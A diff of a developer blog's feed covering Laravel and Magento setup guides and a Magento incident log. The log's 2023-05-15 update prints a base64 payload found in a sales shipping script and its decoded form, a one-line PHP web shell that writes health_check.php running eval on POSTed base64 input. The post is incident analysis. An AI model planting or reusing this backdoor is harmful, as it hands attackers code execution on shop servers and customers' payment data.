+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ php artisan vendor:publish &lt;span class=&quot;token parameter variable&quot;&gt;--provider&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Barryvdh\Debugbar\ServiceProvider&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;### 1.4 Check &lt;code class=&quot;language-text&quot;&gt;.env&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;ini&quot;&gt;&lt;pre class=&quot;language-ini&quot;&gt;&lt;code class=&quot;language-ini&quot;&gt;&lt;span class=&quot;token key attr-name&quot;&gt;APP_DEBUG&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token value attr-value&quot;&gt;true&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;1.5 Clear cache &amp;#x26; config&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ php artisan cache:clear
+$ php artisan config:cache&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;## 2. Xdebug + VS code + macOS&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Setup Magento 2 with Apache on MacOS]]></title><description><![CDATA[Local Environment Operating System Setup Magento with MAMP 1. Composer 2. MAMP Install MAMP Download Setup 
  DB path 3. Create Database…]]></description><link>https://engelin.github.io/magento-mac-setup-apache/</link><guid isPermaLink="false">https://engelin.github.io/magento-mac-setup-apache/</guid><pubDate>Wed, 03 May 2023 13:36:01 GMT</pubDate><content:encoded>&lt;h2&gt;Local Environment&lt;/h2&gt;
 &lt;ol&gt;
 &lt;li&gt;Operating System&lt;/li&gt;
@@ -192,6 +586,8 @@ CONTAINER ID   IMAGE                                                 COMMAND    
 &lt;h4&gt;4-2. Install openresearch&lt;/h4&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ brew &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; opensearch
 $ brew services start opensearch&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;4-3. Set search engine config&lt;/h4&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ /Applications/MAMP/bin/php/php8.2.0/bin/php bin/magento setup:install --base-url&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;http://localhost/ --use-rewrites&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; --elasticsearch-host&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;localhost&quot;&lt;/span&gt; --elasticsearch-port&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;9200&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3&gt;5. Setup Magento 2&lt;/h3&gt;
 &lt;p&gt;Clone the existing project.&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;composer&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -205,6 +601,7 @@ $ &lt;span class=&quot;token function&quot;&gt;chmod&lt;/span&gt; &lt;span class
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ /Applications/MAMP/bin/php/php8.2.0/bin/php &lt;span class=&quot;token parameter variable&quot;&gt;-dmemory_limit&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;5G bin/magento setup:install --backend-frontname&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;admin&quot;&lt;/span&gt; --db-host&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;localhost&quot;&lt;/span&gt; --db-name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;magento&quot;&lt;/span&gt; --db-user&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;root&quot;&lt;/span&gt; --db-password&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;root&quot;&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;--language&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;en_GB&quot;&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;--currency&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;GBP&quot;&lt;/span&gt; --base-url&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;http://localhost/ --admin-user&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;admin&quot;&lt;/span&gt; --admin-password&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;root@123&quot;&lt;/span&gt; --admin-email&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;test@test.com&quot;&lt;/span&gt; --admin-firstname&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;admin&quot;&lt;/span&gt; --admin-lastname&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;user&quot;&lt;/span&gt; --cleanup-database
 $ /Applications/MAMP/bin/php/php8.2.0/bin/php bin/magento cache:clean
 $ /Applications/MAMP/bin/php/php8.2.0/bin/php bin/magento s:s:d en_GB de_DE en_US fr_FR &lt;span class=&quot;token parameter variable&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-j&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/Applications/MAMP/bin/php/php8.2.0/bin/php bin/magento setup:install --base-url=http://localhost/arumdentalshop --db-host=localhost --db-name=arum_shop --db-user=root --db-password=root --admin-firstname=Admin --admin-lastname=User --admin-email=dev@arum3d.com --admin-user=admin --admin-password=admin123 --language=en_GB --currency=GBP --timezone=Europe/London --use-rewrites=1 --backend-frontname=&quot;admin&quot;&lt;/code&gt;&lt;/p&gt;
 &lt;h4&gt;5-4. Errors&lt;/h4&gt;
 &lt;ol&gt;
 &lt;li&gt;Couldn’t find design_config_grid_flat table&lt;/li&gt;
@@ -260,7 +657,7 @@ In Config.php line 452:
 &lt;ol start=&quot;3&quot;&gt;
 &lt;li&gt;Memory limit errors&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 1187840 bytes) in /Applications/MAMP/htdocs/xxx/vendor/magento/framework/Encryption/Adapter/SodiumChachaIetf.php on line 41
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 1187840 bytes) in /Applications/MAMP/htdocs/arumdentalshop/vendor/magento/framework/Encryption/Adapter/SodiumChachaIetf.php on line 41
 
 Check https://getcomposer.org/doc/articles/troubleshooting.md#memory-limit-errors for more info on how to handle out of memory errors.{&quot;messages&quot;:{&quot;error&quot;:[{&quot;code&quot;:500,&quot;message&quot;:&quot;Server internal error. See details in report api\/1134478120890&quot;}]}}%&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Solution:&lt;/p&gt;
@@ -638,7 +1035,7 @@ Building webui
 &lt;p&gt;Refs:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;https://docs.metasfresh.org/installation_collection/EN/How_do_I_setup_the_metasfresh_stack_using_Docker&quot;&gt;How to set up the metasfresh stack using Docker&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Magento Vulnerability logs..]]></title><description><![CDATA[Unauthenticated Remote Code Execution  The vulnerability is triggered by improper input validation during the checkout process. An attacker…]]></description><link>https://engelin.github.io/magento-vulnerability/</link><guid isPermaLink="false">https://engelin.github.io/magento-vulnerability/</guid><pubDate>Wed, 08 Mar 2023 09:45:41 GMT</pubDate><content:encoded>&lt;ol&gt;
+&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Magento Vulnerability logs.. (updated 2023-05-15)]]></title><description><![CDATA[Unauthenticated Remote Code Execution  The vulnerability is triggered by improper input validation during the checkout process. An attacker…]]></description><link>https://engelin.github.io/magento-vulnerability/</link><guid isPermaLink="false">https://engelin.github.io/magento-vulnerability/</guid><pubDate>Wed, 08 Mar 2023 09:45:41 GMT</pubDate><content:encoded>&lt;ol&gt;
 &lt;li&gt;Unauthenticated Remote Code Execution&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;&lt;span
@@ -924,6 +1321,81 @@ Building webui
     &lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;It parses the card payment information and tries to post the encrypted card data to the server again. From this, I could guess that the hacker injected the malicious code or process inside the server.&lt;/p&gt;
 &lt;p&gt;I’ve checked the generated code and all processes for any suspicious stuff, but the injected code was removed before I joined, according to the checking history. Fortunately, none of the user info was taken.&lt;/p&gt;
+&lt;hr&gt;
+&lt;ol start=&quot;2&quot;&gt;
+&lt;li&gt;2023-05-15 update&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/6404fcee372e309aecdc504d8600bd25/7575b/sales_shipping_script.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 10.759493670886075%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAZUlEQVQI13XMSw7CMBAE0dz/lJDgxAHi8YeIscdSIVlsWLB4ql71tK2O+XrhCEJOkVcpqOpQ9U2VgIYnKgfZrwS3IH/dmNwyE0XoZtRaaa2N3buNWklYEnqOnI/7OM1+I+9f/rcfAnCX2JhERuIAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;sales_shipping_script&quot;
+        title=&quot;sales_shipping_script&quot;
+        src=&quot;/static/6404fcee372e309aecdc504d8600bd25/f058b/sales_shipping_script.png&quot;
+        srcset=&quot;/static/6404fcee372e309aecdc504d8600bd25/c26ae/sales_shipping_script.png 158w,
+/static/6404fcee372e309aecdc504d8600bd25/6bdcf/sales_shipping_script.png 315w,
+/static/6404fcee372e309aecdc504d8600bd25/f058b/sales_shipping_script.png 630w,
+/static/6404fcee372e309aecdc504d8600bd25/40601/sales_shipping_script.png 945w,
+/static/6404fcee372e309aecdc504d8600bd25/78612/sales_shipping_script.png 1260w,
+/static/6404fcee372e309aecdc504d8600bd25/7575b/sales_shipping_script.png 1608w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Y2QgcHViO2VjaG8gJzw/cGhwIGVjaG8gIk9LIjtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsidmduIl0pKTsgJyA+IGhlYWx0aF9jaGVjay5waHA=&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I decoded this base64 encrypted string and was able to get the below code:
+&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/4e0d5507fe52a8c3720947b6d9ed7c48/0a867/sales_shipping_script_decode.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 70.25316455696203%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAABdklEQVQ4y6WSO0/DMBSF/f//AQMLAwMTGwMLIIEEAxIMiNI0VRKnieM4aZ59ADno3jahqCkiwtIn29f28bHvFSPrBW/WiHkdbcZZngJo0ODzD3zgo3nvEIGawZc+pJQIggCe58FxHEjpw/MkXNflmNzukZ6E78+491yPzxRFgbIoUVUVRKRDRCqCihSiKIJSm75lM/8Z69a28TiOmSRJIExKg5QnQ0jTlNmNzedziDjRg4SMMQehC4Q2CiY20Fp3C2Sf5n20TvrIsgxC6ZAHpE5BOkCfu1qtsFwuud9lvV6jaZqDCPpU6c6gVQzHcTGdThGGIbv0fZ8vIqG6rhk6RK1PjJo4vz7B6cURzi6PEceaBejZ9DxyTiKLxWJP8FAT9883eHi6xd3jFSb2BJZlwbZtjMdjrkd6ATlu3VLN5XneS1mWEHmRo8wrlEXdlUJLm6DdZB3KMK19Z5kCZn/z0NrkOtQm+rW2hsAO0yxBluWcgP9C//gFys0kDi3fyUAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;sales_shipping_script_decode&quot;
+        title=&quot;sales_shipping_script_decode&quot;
+        src=&quot;/static/4e0d5507fe52a8c3720947b6d9ed7c48/f058b/sales_shipping_script_decode.png&quot;
+        srcset=&quot;/static/4e0d5507fe52a8c3720947b6d9ed7c48/c26ae/sales_shipping_script_decode.png 158w,
+/static/4e0d5507fe52a8c3720947b6d9ed7c48/6bdcf/sales_shipping_script_decode.png 315w,
+/static/4e0d5507fe52a8c3720947b6d9ed7c48/f058b/sales_shipping_script_decode.png 630w,
+/static/4e0d5507fe52a8c3720947b6d9ed7c48/40601/sales_shipping_script_decode.png 945w,
+/static/4e0d5507fe52a8c3720947b6d9ed7c48/0a867/sales_shipping_script_decode.png 986w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;cd pub;echo &apos;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;?php&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;&quot;OK&quot;;@eval(base64_decode($_POST[&quot;vgn&quot;]));&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; health_check.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This script lets shell run to curl from this web, which is a Phishing site as well. I can guess the hacker is trying to inject the code they want with this.&lt;/p&gt;
+&lt;p&gt;But I’ve already updated the Magento version to the latest one(v2.4.6).&lt;/p&gt;
+&lt;p&gt;..? I’m not sure if this is a new attack or not. I’ll keep checking this.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Refs:
 &lt;ul&gt;
